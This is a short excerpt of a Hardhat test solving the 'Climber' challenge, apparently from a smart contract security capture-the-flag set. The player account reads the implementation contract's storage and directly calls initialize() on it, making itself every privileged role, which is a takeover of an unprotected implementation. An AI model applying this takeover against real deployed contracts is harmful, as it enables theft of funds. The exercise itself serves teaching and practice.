...
describe("[Challenge] Climber", function () {
  ...
  it("Execution", async function () {
    ...
    console.log(await ethers.provider.getStorageAt(implementationAddress, 0));
    ...
    const sweeper = await implementationContract
      .connect(player)
      .initialize(player.address, player.address, player.address);
    console.log(sweeper);
  });
